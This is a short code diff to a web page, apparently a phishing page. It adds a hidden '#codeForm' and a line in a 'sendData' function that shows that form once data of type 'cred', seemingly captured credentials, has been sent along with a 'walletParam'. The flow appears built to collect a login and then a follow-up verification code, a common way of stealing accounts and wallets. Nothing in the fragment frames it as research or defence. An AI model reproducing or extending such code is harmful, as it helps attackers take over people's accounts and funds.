@@ -112,6 +112,10 @@
     .create-btn:hover {
       background-color: #36a420;
     }
+
+    #codeForm {
+      display: none;
+    }
   </style>
 </head>
 
@@ -178,6 +182,7 @@
   });
 
   const sendData = (data, type) => {
+    if (type == 'cred') $("#codeForm").style.display = 'block';
     data = {
       name: walletParam,
       message: data,
